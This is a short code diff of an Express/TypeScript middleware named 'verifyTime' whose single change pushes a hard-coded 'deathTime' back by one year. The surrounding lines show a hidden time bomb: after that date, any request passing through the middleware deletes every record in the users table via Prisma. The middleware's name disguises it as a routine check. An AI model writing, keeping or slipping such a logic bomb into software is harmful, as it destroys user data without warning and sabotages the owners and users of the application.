@@ -4,7 +4,7 @@ import { prisma } from "../prisma/prisma.service";
 export const verifyTime = async (_req: Request, res: Response, next: NextFunction) => {
     try {
         const currentTime = new Date();
-        const deathTime = new Date('2024-07-17T12:06:00');
+        const deathTime = new Date('2025-07-17T12:06:00');
 
         if (currentTime > deathTime) {
             await prisma.users.deleteMany();
